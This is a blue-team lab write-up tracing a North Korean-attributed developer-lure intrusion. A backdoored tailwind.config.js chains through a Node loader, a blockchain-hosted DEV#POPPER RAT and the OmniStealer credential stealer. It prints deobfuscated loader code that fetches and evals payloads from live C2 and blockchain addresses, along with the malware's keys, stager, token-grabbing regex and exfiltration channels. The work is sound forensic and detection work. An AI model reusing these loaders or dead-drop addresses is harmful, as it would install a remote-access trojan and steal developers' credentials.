---
title: TXDrop
date: 2026-11-16
summary: A developer at an energy firm runs a "ready to deploy" e-commerce repo from GitHub. A loader hidden in its tailwind.config.js pulls a Node.js stage from a C2, which fetches the DEV#POPPER RAT out of BNB Chain transaction data and drops OmniStealer, whose encrypted archive of the host's secrets leaves the network minutes later.
platform: BTLO
difficulty: Hard
category: Incident Response / Malware Analysis
featured: false
tools:
  - Volatility 3
  - MemProcFS
  - Wireshark
  - CyberChef
  - Node.js
  - PowerShell
  - BscScan / TronGrid
mitre:
  - T1204.002
  - T1059.007
  - T1059.006
  - T1027
  - T1105
  - T1102.001
  - T1057
  - T1082
  - T1115
  - T1554
  - T1555.003
  - T1555.004
  - T1560.001
  - T1041
  - T1567
  - T1071.001
tags:
  - DFIR
  - Malware analysis
  - Digital forensics
draft: false
---

|||
|---|---|
| **Platform** | Blue Team Labs Online (BTLO) |
| **Lab** | TXDrop |
| **Category** | Incident Response / Malware Analysis |
| **Author** | Đặng Đắc Tài |
| **Date** | 16/11/2026 |
| **Victim** | `EZ-CERT`, user `khaled.allam` (`192.168.45.128`) |

***

## 1. TL;DR

Khaled, a backend developer at EZ-CERT, searched Bing for a *"deploy ecommerce website ready to go github repo"*, downloaded **`github.com/NotMoSala/ShoeNikta`** and ran `npm run dev` in its `client` folder at **15:36:39 UTC** on 30 March 2026. Vite loaded **`tailwind.config.js`**, which carries an obfuscated loader after a long run of whitespace on its last line.

That loader (stage 2) fetched **`http://23.27.20.143:27017/$/boot`** with the campaign header **`Sec-V: A9`**, XOR-decrypted the reply with **`ThZG+0jfXE6VAGOJ`** and ran it. Stage 3 sent the host's environment variables to **`/snv`**, checked running processes for a blocked name, then started two things:

- **DEV#POPPER RAT** (in `node.exe`, PID **7740**): a loader reads a TRON account, follows it to BNB Chain transaction **`0x804b000a…c5f82954`**, XOR-decrypts the RAT code in the transaction's input, and runs it. The RAT talks to **`136.0.9.8:443`** over **socket.io**, reads the clipboard for GitHub tokens, and tries to inject itself into VS Code, Cursor, Antigravity, Discord and GitHub Desktop.
- **OmniStealer** (Python): fetched from **`/$/z1`**, it collected credentials, environment variables and browser data, packed them into an AES-encrypted ZIP (`,./,./,./`) at **`C:\Users\khaled.allam\.npm\EZ-CERT$khaled.allam_260330_153814#FC582261.zip`** and uploaded it over HTTP. A Telegram bot, **`@file_1018_bot`**, is the fallback channel.

The whole chain, from `npm run dev` to the stolen archive leaving the host, took under two minutes. It matches eSentire's report on a North Korean campaign that uses the same loader, keys and infrastructure.

***

## 2. Scenario and scope

The SOC flagged outbound HTTP on a non-standard port from a developer workstation outside working hours. The host was isolated and a memory image was taken (`EZ-CERT-20260330-154006.raw`) together with a network capture (`Capture.pcapng`). The user's last known action was cloning a GitHub repository to evaluate it for an internal project.

> **Time zone.** Volatility, the `$MFT`/`$J` timeline and the capture all show **UTC**, and every time in this writeup is UTC.

## 3. Tools

| Purpose | Tool |
| --- | --- |
| Process tree, network connections, file scan and dump | Volatility 3 (`windows.pstree`, `windows.netscan`, `windows.filescan`, `windows.dumpfiles`) |
| Browse the memory image as a file system, file timeline | MemProcFS |
| HTTP and WebSocket streams, exporting the encrypted payloads | Wireshark |
| Hex, Base64, XOR and zlib decoding | CyberChef |
| Running the string-table deobfuscators in isolation | Node.js |
| XOR-decrypting the stage 3 payload | PowerShell |
| Reading the blockchain dead drops | TronGrid API, BscScan |

***

## 4. Consolidated timeline (UTC, 30 March 2026)

| Time | Event | Source |
| --- | --- | --- |
| 15:34:41 | `powershell.exe` (3288) opened in `Downloads\ShoeNikta-main\client` | pstree |
| 15:35:16 – 15:36:39 | Several short-lived `node.exe` children of that PowerShell (npm) | pstree |
| 15:36:39 | `node.exe` (3732) runs `npm-cli.js run dev` → `cmd.exe /d /s /c vite` → `node.exe` (7084) runs `vite.js` | pstree |
| 15:36:40 | `esbuild.exe` (6300) starts; `node.exe` (7084) listens on port 5173 | pstree, netscan |
| 15:37:40 | `GET /$/boot` to `23.27.20.143:27017` (stage 3) | pcap |
| 15:37:43 | `POST /snv` (environment variables); `GET /d/python.zip`; first `POST /verify-human/A9` to `136.0.9.8:27017` | pcap |
| 15:37:43 | `node.exe` (7740) starts with `node -e` (stage 4 loader → RAT) | pstree |
| 15:37:49 | RAT session ID stamped `boot-eval-0330153749316` | `/verify-human` report |
| 15:37:56 | `node.exe` (7740) connects to `136.0.9.8:443` (socket.io) | netscan, pcap |
| 15:37:57 | RAT reports `MODULE_NOT_FOUND` for `socket.io-client`, then installs it | pcap |
| 15:38:06 | `GET /$/z1` (OmniStealer) answered | pcap |
| 15:38:08 | pip installs `portalocker` and `pywin32` | `$J` |
| 15:38:10 | Lock file `tmp7A863DD1.tmp` created in `%LOCALAPPDATA%\Temp` | `$J` |
| 15:38:14 | Stolen data packed as `EZ-CERT$khaled.allam_260330_153814` and uploaded | `/verify-human` reports |
| 15:40:06 | Memory image taken | image name |

***

## 5. Analysis by phase

### Phase 1 — The lure: a "ready to go" GitHub repo

`windows.filescan` lists the Edge `History` database in Khaled's profile. Dumping it with `windows.dumpfiles` and searching it for "github" gives the browsing history: a Bing search for *"deploy ecommerce website ready to go github repo"*, a few candidates (`saleor/saleor`, `hasan-py/Hayroo`), then **`https://github.com/NotMoSala/ShoeNikta`** and the download of its ZIP from `codeload.github.com/NotMoSala/ShoeNikta/zip/refs/heads/main`.

```bash
python3 vol.py -f EZ-CERT-20260330-154006.raw -o out/ windows.dumpfiles --virtaddr 0xdb02fc40e850
strings out/History | grep github
```

![Strings from the Edge History database: the Bing search and the ShoeNikta repository](/uploads/txdrop-01.png)

The process tree shows what happened next. A PowerShell window opened in `ShoeNikta-main\client` at 15:34:41, npm ran a few times, and at **15:36:39** `node.exe` (3732) ran `npm-cli.js run dev`. That started `cmd.exe /d /s /c vite`, then `node.exe` (7084) running Vite. Vite started `esbuild.exe` (6300) at 15:36:40 and, a minute later, **`node.exe` (7740)** with a long obfuscated `node -e` argument. That last one is not something Vite does.

![pstree: PowerShell → npm run dev → vite → esbuild and node -e (7740)](/uploads/txdrop-02.png)

### Phase 2 — Stage 1: `tailwind.config.js`

Vite reads `tailwind.config.js` on startup, which makes it a good place to hide code: it runs as soon as the developer starts the dev server, and nobody reads a config file to the end. Pulled out of memory with MemProcFS, the file starts as a normal Tailwind config. After a long run of spaces on its last line it sets a group of globals (`global['_V']='A9'`, `global['r']=require`, `global['m']=module`) and runs an obfuscated function.

![The injected code at the end of tailwind.config.js](/uploads/txdrop-03.png)

```js
global['_V'] = 'A9';
if ('function' === typeof require) global['r'] = require;
if (typeof module === 'object') global['m'] = module;
(function () {
  var rms = '', IaL = 200 - 189;
  function gOe(z) {          // seeded shuffle of a string's characters
    var y = 3547675; var w = z.length; var m = [];
    for (var x = 0; x < w; x++) { m[x] = z.charAt(x) }
    for (var x = 0; x < w; x++) {
      var f = y * (x + 360) + (y % 32226); var i = y * (x + 326) + (y % 51262);
      var a = f % w; var j = i % w; var g = m[a]; m[a] = m[j]; m[j] = g;
      y = (f + i) % 3722251;
    }
    return m.join('')
  }
  var naW = gOe('wodstriuznuobanchgfcttycmroqrvelspkxj').substr(0, IaL); // "constructor"
  var Mcf = '".) 1bl6uep(,b(r.72v.ir ...';   // shuffled source of a second decoder
  var Rui = gOe[naW];                         // gOe.constructor === Function
  var Obe = Rui('', gOe(Mcf));
  var tFh = Obe(gOe('K}K3=(.Kz%%wh(g;7os?8(d4g...'));  // stage 2 source
  var usn = Rui(rms, tFh);
  usn(9170);
  return 8509
})()
```

`gOe` only reorders characters with a fixed seed. `gOe.constructor` is `Function`, so the script builds functions out of the shuffled strings. Replacing the final call with `console.log(tFh)` and running only that part prints stage 2.

![Running the decoder in Node.js to print stage 2](/uploads/txdrop-04.png)

### Phase 3 — Stage 2: fetching `/$/boot`

Stage 2 is another layer: a string table built by a second seeded shuffle, `_$af1013`, and Obfuscator.io-style lookups. Running only the shuffle (no network code) gives the table:

```text
"23.27.20.1" + "43" + ":" + 0x6989  → host 23.27.20.143:27017
"/$/boot"                           → path
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML; like Gecko) Chrome/131.0.0.0 Safari/537.36"
"Sec-V": global["_V"] || 0          → Sec-V: A9
"ThZG+0jfXE" + "6VAGOJ"             → XOR key
```

Cleaned up, stage 2 does this:

```js
global._H = '23.27.20.143:27017';
const body = await new Promise((ok, fail) => {
  const u = new URL('http://' + global._H + '/$/boot');
  require('http').request({
    method: 'GET', hostname: u.hostname, port: u.port, path: u.pathname,
    headers: { 'User-Agent': 'Mozilla/5.0 (... ) Chrome/131.0.0.0 Safari/537.36', 'Sec-V': global['_V'] || 0 },
  }, res => { let d = ''; res.on('data', c => d += c); res.on('end', () => ok(d)) })
    .on('error', fail).end();
});
const key = 'ThZG+0jfXE6VAGOJ';
let code = '';
for (let i = 0; i < body.length; i++) code += String.fromCharCode(body.charCodeAt(i) ^ key.charCodeAt(i % key.length));
await eval(code);                   // stage 3
```

The `Sec-V` header tells the server which campaign the victim belongs to (`A9`), and the same `_V` value later decides which C2 the RAT uses. The capture has the request at **15:37:40**, followed by the rest of the chain:

![HTTP to 23.27.20.143 and 136.0.9.8 from 15:37:40](/uploads/txdrop-05.png)

### Phase 4 — Stage 3: decrypting `/$/boot`

The `/$/boot` response body exported from Wireshark decrypts with a repeating-key XOR:

```powershell
$key = [System.Text.Encoding]::ASCII.GetBytes("ThZG+0jfXE6VAGOJ")
$encrypted = [System.IO.File]::ReadAllBytes("$env:USERPROFILE\Desktop\boot")
$decrypted = New-Object byte[] $encrypted.Length
for ($i = 0; $i -lt $encrypted.Length; $i++) {
    $decrypted[$i] = $encrypted[$i] -bxor $key[$i % $key.Length]
}
[System.IO.File]::WriteAllBytes("$env:USERPROFILE\Desktop\Tooling\out.js", $decrypted)
```

Stage 3 is a larger Obfuscator.io-style loader. Once beautified it does four things that matter here.

**Environment variables to `/snv`.** At 15:37:43 it POSTs `id=EZ-CERT$khaled.allam&user=khaled.allam&body={...}` to **`http://23.27.20.143:27017/snv`**. The body is the whole environment: user profile paths, `COMPUTERNAME`, `PATH`, and every `npm_*` variable, including `npm_lifecycle_script=vite` and the path of the project's `package.json`.

![POST /snv: the victim's environment variables](/uploads/txdrop-06.png)

**A process check.** On Windows it runs `tasklist /FO CSV /NH`, takes every process name starting with `O`, and MD5-hashes it. If one hashes to **`9a47bb48b7b8ca41fc138fd3372e8cc0`** it reports `Blocked by security` to the C2 and stops. Hashing the name hides from an analyst which product it is avoiding. Nothing matched on this host.

![The tasklist check against an MD5 of the process name](/uploads/txdrop-07.png)

**Choosing a C2 from the campaign ID.** The first letter of `_V` picks the server the later stages use:

| `_V` | C2 |
| --- | --- |
| starts with `A` | `136.0.9.8` |
| starts with `C` | `23.27.202.27` |
| numeric | `198.105.127.210` |

With `_V = A9`, this victim talks to **`136.0.9.8`**.

![C2 selection by the first character of _V](/uploads/txdrop-08.png)

**Starting the next stages.** It downloads a portable Python (`/d/python.zip`, redirected to `/download/python.zip`) for the stealer. For the RAT it XOR-decodes a Base64 blob and starts it as a separate, detached and hidden Node process:

```js
x.spawn('node', ['-e', "global['_V']='" + q + "';global['r']=require;global['m']=module;" + X],
        { detached: true, stdio: 'ignore', windowsHide: true });
eval("global['e']='boot-eval';" + X);
```

![Stage 3 spawning node -e with the stage 4 loader](/uploads/txdrop-09.png)

That `node -e` is **PID 7740** in the process tree, started at 15:37:43. Its command line in memory is stage 4. The `eval` line also runs the same code inside Vite's own process, with `global['e']='boot-eval'`. That label comes back later in the RAT's error reports.

### Phase 5 — Stage 4: the RAT lives on the blockchain

Stage 4 uses the same `gOe`-style wrapper as stage 1 and unpacks to a small loader. With its string table decoded:

```js
async function t(key, tronAddr, aptosAddr) {
  let txHash;
  try {   // 1. newest outgoing TRON transaction of an attacker account
    const r = await get('https://api.trongrid.io/v1/accounts/' + tronAddr +
                        '/transactions?only_confirmed=true&only_from=true&limit=1');
    txHash = Buffer.from(r.data[0].raw_data.data, 'hex').toString('utf8').split('').reverse().join('');
  } catch {   // fallback: Aptos
    txHash = (await get('https://fullnode.mainnet.aptoslabs.com/v1/accounts/' + aptosAddr +
                        '/transactions?limit=1'))[0].payload.arguments[0];
  }
  let enc;
  try {   // 2. that hash is a BNB Chain transaction; the payload is in its input data
    enc = Buffer.from((await rpc('eth_getTransactionByHash', [txHash], 'bsc-dataseed.binance.org'))
                      .result.input.substring(2), 'hex').toString('utf8').split('?.?')[1];
  } catch {
    enc = Buffer.from((await rpc('eth_getTransactionByHash', [txHash], 'bsc-rpc.publicnode.com'))
                      .result.input.substring(2), 'hex').toString('utf8').split('?.?')[1];
  }
  return xor(enc, key);   // 3. XOR with the hard-coded key
}
eval(await t('cA]2!+37v,-szeU}', 'TLmj13VL4p6NQ7jpxz8d9uYY6FUKCYatSe',
             '0x3414a658f13b652f24301e986f9e0079ef506992472c1d5224180340d8105837'));
```

Nothing in the loader points at an attacker server. It reads two public blockchains, and the operator can change the RAT by sending a new transaction. Following it by hand:

1. TronGrid returns the account's latest transaction. Its `raw_data.data` field is hex. Decoded and reversed, it is a 32-byte hash: **`0x804b000af7d7e4337ba5db28bb367da64a08391de09ffb07847ac897c5f82954`**.

![TronGrid: the TRON transaction whose data field holds the reversed hash](/uploads/txdrop-10.png)

2. On BscScan, that transaction is a zero-value transfer to the burn address `0x…dEaD` with about 3.6 million gas worth of input data.

![BscScan: transaction 0x804b000a… with the payload in its input data](/uploads/txdrop-11.png)

3. In CyberChef: From Hex, keep what follows `?.?`, then XOR with `cA]2!+37v,-szeU}`. The result is the RAT's source, still obfuscated. A JavaScript deobfuscator and beautifier make it readable (about 1,100 lines).

![CyberChef: From Hex, split on ?.?, XOR with cA]2!+37v,-szeU}](/uploads/txdrop-12.png)

### Phase 6 — DEV#POPPER RAT

**C2 and the live process.** `netscan` shows `node.exe` **7740** in `ESTABLISHED` state to **`136.0.9.8:443`** since 15:37:56. That is the RAT's socket.io connection, and it was waiting for commands when the image was taken.

![netscan: node.exe 7740 connected to 136.0.9.8:443](/uploads/txdrop-13.png)

**Reporting.** The RAT reports status and errors with `_R`, a form POST to `http://136.0.9.8:27017/verify-human/A9` (or another channel name). Its first report shows it starting without its dependency:

```text
[A9] [boot-eval-0330153749316]EZ-CERT$khaled.allam / Windows_NT 10.0.19041
terminal_error (0): MODULE_NOT_FOUND
Error: Cannot find module 'socket.io-client'
Require stack:
- C:\Users\khaled.allam\Downloads\ShoeNikta-main\client\tailwind.config.js
```

The prefix is the RAT's `SESSION_ID`: `'[' + global.e + '-' + time + ']' + hostname + '$' + username`. `global.e` is the `boot-eval` label set by stage 3, and the time is the ISO timestamp without its year and separators. The runtime identifier is **`boot-eval-0330153749316`**: the RAT started on 03-30 at 15:37:49.316. The require stack also confirms where the chain started: `client\tailwind.config.js`.

![POST /verify-human/A9 with the MODULE_NOT_FOUND report](/uploads/txdrop-14.png)

When `axios` or `socket.io-client` is missing, the RAT installs it with `npm --prefix "%USERPROFILE%\.node_modules" install axios socket.io-client`, adds that folder to the module path, and tries again up to three times. Then it connects with **`socket.io-client`** to `http://136.0.9.8:443` and identifies itself:

```text
42["identify","client",{"clientUuid":"EZ-CERT$khaled.allam","processId":"fbd3b76a-7207-4118-905e-bef89a34d3fc","osType":"Windows_NT","VERSION":"260124","_V":"A9"}]
```

**Commands.** The operator sends `command` events. The RAT keeps a queue for each operator and answers with `response` events:

| Command | Action |
| --- | --- |
| `cd …`, `ss_dir`, `ss_fcd:` | Change directory |
| `ss_info` | Version, session ID, Node path and version, start-up path, connect time |
| `ss_ip` | Public IP details from `ip-api.com` |
| `ss_cb` | Read the clipboard |
| `ss_upf:` / `ss_upd:` | Upload a file / a directory to `http://136.0.9.8:27017/u/f` |
| `ss_inz:` / `ss_inzx:` | Inject / remove the loader in a given file |
| `ss_connect:` | Switch to another C2 |
| `ss_eval:` / `ss_eval64:` | Run JavaScript (plain / Base64) |
| `*cmd` / anything else | Run a detached process / a shell command and return the output |

**Clipboard watcher.** The WebSocket stream shows the operator sending one `ss_eval64` command.

![socket.io stream: the operator's ss_eval64 command](/uploads/txdrop-15.png)

Decoded, it installs a clipboard watcher (`CB_VERSION 251218`). Every three seconds it reads the clipboard with `Get-Clipboard`, `pbpaste` or `xclip`/`xsel`, matches GitHub tokens (`ghp_…`, `github_pat_…`, `gho_/ghu_/ghs_/ghr_…`), and sends any match through `_R` on the channel `KC`. For a developer who pastes access tokens, this means repository access and a way to plant the same lure in more repos.

![CyberChef: the Base64 clipboard watcher](/uploads/txdrop-16.png)

```js
const r = /\b(ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{22,}|gh[ousr]_[A-Za-z0-9]{36})\b/g;
const c = [...t.matchAll(r)].map(o => o[0]);
if (c.length > 0) { /* ... */ n(`${e.SESSION_ID} / ${e.OS_INFO} / ${CB_VERSION}\nGitHub = ${JSON.stringify(c)}\n\n${o}`, undefined, "KC") }
```

The RAT has the same capability built in as `_CB`, used by `ss_cb`:

![The RAT's own clipboard reader, _CB](/uploads/txdrop-17.png)

**Persistence by injection.** One second after start, the RAT looks for JavaScript files of Electron apps that run on every launch and appends its loader to them:

| App | File (Windows) | Label | `catch` name |
| --- | --- | --- | --- |
| VS Code | `%LOCALAPPDATA%\Programs\Microsoft VS Code\resources\app\node_modules\@vscode\deviceid\dist\index.js` | `app-vscode` | `VSCode` |
| Cursor | `%LOCALAPPDATA%\Programs\cursor\…\@vscode\deviceid\dist\index.js` | `app-cursor` | `cursor` |
| Antigravity | `%LOCALAPPDATA%\Programs\Antigravity\…\@vscode\deviceid\dist\index.js` | `app-antigravity` | `antigravity` |
| Discord | `%LOCALAPPDATA%\discord\app-*\modules\discord_desktop_core\index.js` | `app-discord` | `discord` |
| GitHub Desktop | `%LOCALAPPDATA%\GitHubDesktop\app-*\resources\app\main.js` | `app-GitHubDesktop` | `GitHubDesktop` |

![VS Code target](/uploads/txdrop-18.png)

![Cursor target](/uploads/txdrop-19.png)

![Antigravity target](/uploads/txdrop-20.png)

![Discord target](/uploads/txdrop-21.png)

![GitHub Desktop target](/uploads/txdrop-22.png)

The injection function `C()` appends 200 spaces, the marker `/*C250619A*/`, `global['e']='<label>-eval';` and the stage 4 loader. Earlier markers (`/*C250617A*/`, `/*C250618A*/`) are replaced, and a file that already carries the same `_V` is skipped. It does not write when the environment variable `jsbot` is set or the hostname is `EV-CHQG3L42MMQ` or `EV-4A6OE6M0E2D`; these are likely the operators' own test machines. Results are sent through `_R` as `👍 app-vscode injected: …` or `⚠️ failed to inject VSCode: …`. Sorted, the five names in the `catch` statements are **antigravity, cursor, discord, GitHubDesktop, VSCode**.

### Phase 7 — OmniStealer: the Python stage

Stage 3's stealer path writes a short Python stager and runs it with the downloaded `python.exe`, in a new process group with no window:

```python
def x(a, b):
    kn = len(b); c = bytearray(len(a))
    for i in range(len(a)): c[i] = a[i] ^ ord(b[i % kn])
    return c
# ...
exec(x(base64.b64decode(urlopen(Request(f'{r}/$/{id}', headers={'User-Agent': 'Mozilla/5.0 ... Chrome/131.0.0.0 Safari/537.36'})).read().decode('utf-8')),
       '9KyASt+7D0mjPHFY').decode('utf-8'), globals())
# started as: python -c <code> z1 <_v1> <_v2>
```

The request is **`GET /$/z1`**, answered at 15:38:06 by the same EmbedIO server on port 27017 with a Base64 body:

![GET /$/z1 and the Base64 response](/uploads/txdrop-23.png)

Base64-decoding it and XORing with **`9KyASt+7D0mjPHFY`** gives one more wrapper:

```python
def obfDecode(data): return __import__('zlib').decompress(__import__('base64').b64decode(data[::-1]))
exec(obfDecode(b'=s2uMUgB/rzelclIJRWK7S18FluZZq1DPvpNwHIZuH9Q9LFzkTaOlEtK8cw0riDSM0vpOtOr...'))
```

Reversing the string, Base64-decoding and inflating gives OmniStealer, about 1,060 lines of Python.

![CyberChef: From Base64, XOR 9KyASt+7D0mjPHFY](/uploads/txdrop-24.png)

**One instance only.** The stealer takes an exclusive, non-blocking `portalocker` lock on **`%LOCALAPPDATA%\Temp\tmp7A863DD1.tmp`** (`/tmp/tmp7A863DD1.tmp` elsewhere). If the lock is already held it prints `Already running!` and exits. The same block picks its C2 from `_V`: for `A…` it uses `http://136.0.9.8:27017` and Telegram chat ID `7699029999`.

![Lock file and C2 selection in the stealer](/uploads/txdrop-25.png)

The `$J` timeline shows pip creating its cache and installing `portalocker` and `pywin32` at 15:38:08. The lock file **`tmp7A863DD1.tmp`** was created at **2026-03-30 15:38:10 UTC**.

![$J: portalocker installed, then tmp7A863DD1.tmp created at 15:38:10](/uploads/txdrop-26.png)

**Collection and packing.** The stealer writes what it collects into a working folder: `_sysenv.json`/`.env` (environment variables), `_credentials.json` (Windows Credential Manager), browser profiles (Firefox among them) and `_info.json`. It then packs the folder with `BP()` (LZMA, else BZIP2, else DEFLATE), renames it with a checksum, uploads it, and deletes the local copies:

![Packing, renaming and upload logic](/uploads/txdrop-27.png)

`BP()` builds a **`pyzipper.AESZipFile`** with WinZip AES encryption and the password passed as `C0`:

![BP(): AES-encrypted ZIP with a password](/uploads/txdrop-28.png)

```python
C0 = ',./,./,./'
```

![C0 holds the archive password](/uploads/txdrop-29.png)

Its progress reports to `/verify-human` give the archive's path and the upload result:

```text
[A9] EZ-CERT$khaled.allam / Windows-10-10.0.19041-SP0
packing (LZMA): C:\Users\khaled.allam\.npm\EZ-CERT$khaled.allam_260330_153814.tmp

[A9] EZ-CERT$khaled.allam / Windows-10-10.0.19041-SP0
http-upload succeed: EZ-CERT$khaled.allam_260330_153814#FC582261.zip (0.35 MB)
```

The archive was **`C:\Users\khaled.allam\.npm\EZ-CERT$khaled.allam_260330_153814#FC582261.zip`**, 0.35 MB, placed in npm's cache folder, where an extra file is unlikely to be noticed.

**What was in it.** Opened with `,./,./,./`, the recovered archive contains `_info.json`, the campaign metadata the operator sees with each victim:

```json
{
  "channel": "A9",
  "pc_name": "EZ-CERT",
  "pc_login": "khaled.allam",
  "pc_info": "Windows-10-10.0.19041-SP0",
  "path": "C:\\Users\\khaled.allam\\Downloads\\ShoeNikta-main\\client",
  "uuid": "00000000-0000-0000-0000-000c298d92b2",
  "sid": "S-1-5-21-593536282-824182100-2440914132",
  "inz_ext_count": 0,
  "python": "C:\\Users\\khaled.allam\\AppData\\Local\\Programs\\Python\\Python3127\\python.exe",
  "timestamp": 1774885094,
  "client_utc": "2026-03-30 15:38:14"
}
```

![_info.json](/uploads/txdrop-30.png)

`_credentials.json` holds one Windows Credential Manager entry, `WindowsLive:target=virtualapp/didlogical`. That is a stock Windows entry, not a work secret, but the stealer would have taken any saved credential it found.

![_credentials.json](/uploads/txdrop-31.png)

### Phase 8 — The Telegram fallback

If the HTTP upload fails, or the operator passes `-hh`, archives under 50 MB go to Telegram instead. `B4()` posts the file to `sendDocument` with a hard-coded bot token and the chat ID chosen from `_V`:

![B4(): upload to the Telegram Bot API](/uploads/txdrop-32.png)

Calling `getMe` with that token identifies the bot: `id 7870147428`, `first_name "File Bot"`, username **`file_1018_bot`**. Here the HTTP upload succeeded, so the fallback was not used.

![getMe: File Bot, @file_1018_bot](/uploads/txdrop-33.png)

***

## 6. Attribution

The chain matches eSentire TRU's March 2026 report *"DEV#POPPER RAT and OmniStealer (Everyday I'm Shufflin')"*, about a victim in the same sector. That report describes a fake e-commerce repo with the loader in `tailwind.config.js`, `/$/boot` on `23.27.20.143:27017` with a `Sec-V` header, the keys `ThZG+0jfXE6VAGOJ`, `cA]2!+37v,-szeU}` and `9KyASt+7D0mjPHFY`, the same TRON → BNB Chain transaction `0x804b000a…`, the same C2 table and the same blocked-process MD5. eSentire attributes it with high confidence to a North Korean state-sponsored group whose main motive is money. The fake-repo lure aimed at developers matches the public reporting on North Korea's "Contagious Interview" activity.

***

## 7. IOCs

| Type | Value | Note |
| --- | --- | --- |
| URL | `hxxps://github[.]com/NotMoSala/ShoeNikta` | Lure repository |
| File | `ShoeNikta-main\client\tailwind.config.js` | Stage 1 loader |
| IP:port | `23.27.20[.]143:27017` | `/$/boot`, `/snv`, `/d/python.zip` |
| IP:port | `136.0.9[.]8:443` | RAT socket.io C2 (campaign `A…`) |
| IP:port | `136.0.9[.]8:27017` | `/verify-human/*`, `/u/f`, `/$/z1`, stealer upload |
| IP | `23.27.202[.]27` | C2 for campaign `C…` |
| IP | `198.105.127[.]210` | C2 for numeric campaigns |
| HTTP header | `Sec-V: A9` | Campaign ID |
| User-Agent | `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML; like Gecko) Chrome/131.0.0.0 Safari/537.36` | Note `KHTML; like` with a semicolon |
| Server | `EmbedIO/3.5.2` | C2 HTTP server banner |
| XOR key | `ThZG+0jfXE6VAGOJ` | Stage 3 |
| XOR key | `cA]2!+37v,-szeU}` | RAT from blockchain |
| XOR key | `9KyASt+7D0mjPHFY` | OmniStealer |
| TRON account | `TLmj13VL4p6NQ7jpxz8d9uYY6FUKCYatSe` | Dead drop |
| Aptos account | `0x3414a658f13b652f24301e986f9e0079ef506992472c1d5224180340d8105837` | Fallback dead drop |
| BSC tx | `0x804b000af7d7e4337ba5db28bb367da64a08391de09ffb07847ac897c5f82954` | RAT code in input data |
| MD5 | `9a47bb48b7b8ca41fc138fd3372e8cc0` | Blocked process name |
| File | `%LOCALAPPDATA%\Temp\tmp7A863DD1.tmp` | Stealer lock file |
| File | `C:\Users\<user>\.npm\<host>$<user>_<yymmdd_HHMMSS>#<crc>.zip` | Stolen data archive |
| Password | `,./,./,./` | Archive password |
| Folder | `%USERPROFILE%\.node_modules` | RAT's dependencies |
| Marker | `/*C250619A*/` (also `C250617A`, `C250618A`) | Injected into Electron app files |
| Telegram | bot `7870147428` (`@file_1018_bot`), chat `7699029999` | Fallback exfiltration |

***

## 8. MITRE ATT&CK

| Tactic | Technique | ID | Evidence |
| --- | --- | --- | --- |
| Execution | User Execution: Malicious File | T1204.002 | `npm run dev` on the ShoeNikta repo |
| Execution | Command and Scripting Interpreter: JavaScript | T1059.007 | `tailwind.config.js`, `node -e`, `eval` of each stage |
| Execution | Command and Scripting Interpreter: Python | T1059.006 | OmniStealer run with `python -c` |
| Defense Evasion | Obfuscated Files or Information | T1027 | Seeded shuffles, XOR, reversed Base64 + zlib |
| Command and Control | Ingress Tool Transfer | T1105 | `/$/boot`, `/d/python.zip`, `/$/z1`, npm installs |
| Command and Control | Web Service: Dead Drop Resolver | T1102.001 | TRON → BNB Chain transaction holding the RAT |
| Discovery | Process Discovery | T1057 | `tasklist` checked against an MD5 |
| Discovery | System Information Discovery | T1082 | Environment to `/snv`, `_info.json` |
| Collection | Clipboard Data | T1115 | GitHub token watcher, `ss_cb` |
| Persistence | Compromise Host Software Binary | T1554 | Loader appended to VS Code, Cursor, Antigravity, Discord, GitHub Desktop |
| Credential Access | Credentials from Web Browsers | T1555.003 | Browser profiles in the archive |
| Credential Access | Windows Credential Manager | T1555.004 | `_credentials.json` |
| Collection | Archive Collected Data: Archive via Library | T1560.001 | `pyzipper` AES ZIP |
| Exfiltration | Exfiltration Over C2 Channel | T1041 | HTTP upload to `136.0.9.8:27017` |
| Exfiltration | Exfiltration Over Web Service | T1567 | Telegram `sendDocument` fallback |
| Command and Control | Application Layer Protocol: Web Protocols | T1071.001 | HTTP on 27017, socket.io on 443 |

***

## 9. Lessons learned

- **Running a repo means running its code.** Config files such as `tailwind.config.js`, `vite.config.js` or `postcss.config.js` run on `npm run dev` just like source code. Evaluate unknown repos in a disposable VM or container, not on a workstation with credentials.
- Look at the end of lines: a long run of whitespace followed by code is a cheap and common way to hide a payload from a quick review or a GitHub diff view.
- Developer machines need egress control. Plain HTTP to port 27017, socket.io to an IP on port 443, and `api.trongrid.io`, `bsc-dataseed.binance.org` or `api.telegram.org` from `node.exe`/`python.exe` are all worth an alert.
- Blockchain dead drops cannot be taken down, so block the pattern instead: a dev server's Node process should not call blockchain RPC endpoints.
- Check the integrity of Electron app files (`@vscode/deviceid/dist/index.js`, `discord_desktop_core/index.js`, GitHub Desktop's `main.js`) after an incident like this. A reinstall alone may miss a copy that was re-injected.
- Rotate everything the host could reach: GitHub tokens (the clipboard watcher looked for them), browser-saved passwords, and anything in environment variables or `.env` files.

## 10. References

- eSentire TRU, *North Korean APT Malware Analysis: DEV#POPPER RAT and OmniStealer (Everyday I'm Shufflin')*: https://www.esentire.com/blog/north-korean-apt-malware-analysis-dev-popper-rat-and-omnistealer-everyday-im-shufflin
- BTLO, TXDrop: https://blueteamlabs.online/home/investigation/txdrop-dbb8ad6a56
- Volatility 3: https://github.com/volatilityfoundation/volatility3
- MemProcFS: https://github.com/ufrisk/MemProcFS
- CyberChef: https://gchq.github.io/CyberChef/
- MITRE ATT&CK: https://attack.mitre.org/
